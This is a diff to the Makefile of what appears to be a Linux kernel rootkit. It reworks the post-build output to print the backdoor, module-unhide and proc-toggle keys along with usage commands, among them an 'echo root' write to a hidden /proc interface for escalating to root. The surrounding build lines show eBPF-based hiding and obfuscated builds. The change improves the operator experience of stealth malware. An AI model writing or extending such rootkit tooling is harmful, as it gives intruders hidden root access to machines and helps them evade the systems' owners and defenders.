@@ -73,22 +73,41 @@ all:
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo "Build complete."
-	@echo -n "Backdoor KEY: "
-	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
-	@echo -n "LKM unhide KEY: "
-	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
-	@echo -n "Proc toggle KEY: "
-	@echo "\033[1;37m$(PRCKEY)\033[0m" | sed 's/0x//'
-	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
-	@echo -n "Build type: "
+	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+	@echo "Build Configuration:"
+	@echo "  Kernel version: $(shell uname -r)"
+	@echo "  Architecture: $(shell uname -m)"
+	@echo "  Compiler: $(shell gcc --version | head -1)"
+	@echo -n "  Build mode: "
 ifdef DEPLOY
-	@echo "\033[1;37mRELEASE\033[0m"
+	@echo "RELEASE"
 else
-	@echo "\033[1;37mDEBUG\033[0m"
+	@echo "DEBUG"
 endif
 ifdef OBFUSCATE
-	@echo "\033[1;37mObfuscated build with gcc-12 compiler\033[0m"
+	@echo "  Obfuscation: enabled (gcc-12)"
+else
+	@echo "  Obfuscation: disabled"
 endif
+	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+	@echo "Module Information:"
+	@echo "  Module file: $(OBJNAME).ko"
+	@echo "  Proc interface: /proc/$(PROCNAME)"
+	@echo "  Timeout: $(PRCTIMEOUT) seconds"
+	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+	@echo "Cryptographic Keys (save these!):"
+	@echo -n "  Backdoor KEY: "
+	@echo "$(BDKEY)" | sed 's/0x//'
+	@echo -n "  Unhide KEY: "
+	@echo "$(UNHIDEKEY)" | sed 's/0x//'
+	@echo -n "  Proc toggle KEY: "
+	@echo "$(PRCKEY)" | sed 's/0x//'
+	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+	@echo "Usage Commands:"
+	@echo "  Toggle proc UI:    rm -f $(subst 0x,,$(PRCKEY))"
+	@echo "  Escalate to root:  echo root > /proc/$(PROCNAME)"
+	@echo "  View help:         echo help > /proc/$(PROCNAME) && cat /proc/$(PROCNAME)"
+	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 $(EBPF_BPF_OBJ): $(EBPF_C_SRC)
 	clang -O2 -g -Wall \
